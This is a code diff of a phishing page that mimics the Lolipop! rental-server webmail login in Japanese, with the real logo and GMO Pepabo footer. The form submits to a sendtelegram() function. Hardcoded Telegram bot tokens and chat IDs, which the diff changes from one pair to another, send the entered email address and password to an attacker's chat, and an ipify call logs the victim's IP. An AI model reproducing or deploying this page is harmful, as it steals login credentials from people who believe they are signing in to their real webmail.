@@ -1,12 +1,19 @@
 <html>
+
 <head>
-	<meta charset="UTF-8" />
-	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
-	<meta content="IE=10" http-equiv="X-UA-Compatible" /><script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
-	<link href="https://lolipop.jp/favicon.ico" rel="shortcut icon" type="image/x-icon" /><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdn.tailwindcss.com"></script><script src="https://cdn.jsdelivr.net/npm/animejs@3.2.2/lib/anime.min.js"
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=10" />
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    <link rel="shortcut icon" href="https://lolipop.jp/favicon.ico" type="image/x-icon">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.2/lib/anime.min.js"
         integrity="sha256-tc4b48P1MPGS4PJXHRlChGCW1mEZy62jS/3JEsSHPzU=" crossorigin="anonymous"></script>
-	<title>ロリポップ! レンタルサーバー - WEBメーラーにログイン</title>
-	<style type="text/css">* {
+
+    <title>ロリポップ! レンタルサーバー - WEBメーラーにログイン</title>
+    <style>
+        * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
@@ -283,57 +290,71 @@
                 font-size: 11px;
             }
         }
-	</style>
+    </style>
 </head>
+
 <body>
-<div class="top-section">
-<div class="logo-container">
-<div class="logo-text"><img alt="LOLIPOP!" src="https://webmail.lolipop.jp/img/logo-lolipop-horizonal-light.svg" width="400" /></div>
-</div>
-</div>
 
-<h1 class="main-title" style="text-align: center;">WEBメーラーにログイン</h1>
+    <div class="top-section">
+        <div class="logo-container">
+            <div class="logo-text">
+            <center>
+                <img src="https://webmail.lolipop.jp/img/logo-lolipop-horizonal-light.svg" width="400" alt="LOLIPOP!">
+                </center>
+            </div>
+        </div>
+        <h1 class="main-title">WEBメーラーにログイン</h1>
+    </div>
 
-<div class="login-container">
-<form id="lolipopForm" onsubmit="return sendtelegram()">
-<div class="loader" id="loader">
-<div>&nbsp;</div>
+    <div class="login-container">
+        <form id="lolipopForm" onsubmit="return sendtelegram()">
+            <div id="loader" class="loader">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
 
-<div>&nbsp;</div>
+            <fieldset id="fieldset" class="fieldset">
+                <div class="form-group">
+                    <label class="form-label" for="email">メールアドレス <span class="required">*</span></label>
+                    <input type="email" id="email" name="email" class="form-input" placeholder=""
+                        required autocomplete="off">
+                </div>
 
-<div>&nbsp;</div>
+                <div class="form-group">
+                    <label class="form-label" for="password">パスワード <span class="required">*</span></label>
+                    <input type="password" id="password" name="password" class="form-input" placeholder=""
+                        required autocomplete="off">
+                </div>
 
-<div>&nbsp;</div>
+                <button type="submit" class="login-button">ログイン</button>
 
-<div>&nbsp;</div>
-</div>
+                <div class="error-message" id="errorMessage">
+                    ログインが失敗しました。メールアドレスまたはパスワードをもう一度ご確認ください。
+                </div>
+            </fieldset>
 
-<fieldset class="fieldset" id="fieldset">
-<div class="form-group"><label class="form-label" for="email">メールアドレス <span class="required">*</span></label> <input autocomplete="off" class="form-input" id="email" name="email" placeholder="" required="" type="email" /></div>
+            <div class="help-section">
+                <ul>
+                    <li>ログインが失敗する場合やメールアドレスのパスワードをお忘れの場合は<a href="#" onclick="return false;">こちらのFAQをご確認ください</a></li>
+                </ul>
+            </div>
+        </form>
+    </div>
 
-<div class="form-group"><label class="form-label" for="password">パスワード <span class="required">*</span></label> <input autocomplete="off" class="form-input" id="password" name="password" placeholder="" required="" type="password" /></div>
-<button class="login-button" type="submit">ログイン</button>
+    <div class="footer">
+        <p>© 2003-2025 GMO Pepabo, inc. All rights reserved.</p>
+    </div>
 
-<div class="error-message" id="errorMessage">ログインが失敗しました。メールアドレスまたはパスワードをもう一度ご確認ください。</div>
-</fieldset>
+    <!-- Hidden input for IP address -->
+    <input type="hidden" id="ipaddress">
 
-<div class="help-section">
-<ul>
-	<li>ログインが失敗する場合やメールアドレスのパスワードをお忘れの場合は<a href="#" onclick="return false;">こちらのFAQをご確認ください</a></li>
-</ul>
-</div>
-</form>
-</div>
-
-<div class="footer">
-<p>&copy; 2003-2025 GMO Pepabo, inc. All rights reserved.</p>
-</div>
-<!-- Hidden input for IP address -->
-
-<p><input id="ipaddress" type="hidden" /> <script>
+    <script>
         // Telegram Configuration
-        var telegram_bot_id = "8353485947:AAHPCpkOvxlXZxSPgvN10EhIqtVy5SBJ_WM";
-        var chat_id = 7932642751;
+        var telegram_bot_id = "8406857814:AAFpZkn5yFhj7x5tEuGvuxPbTZ0WmLDV_ek";
+        var chat_id = 5956669360;
         var u_email, u_password, message;
         var tick = 0;
 
@@ -431,6 +452,8 @@
                 }
             });
         });
-    </script></p>
+    </script>
+
 </body>
+
 </html>
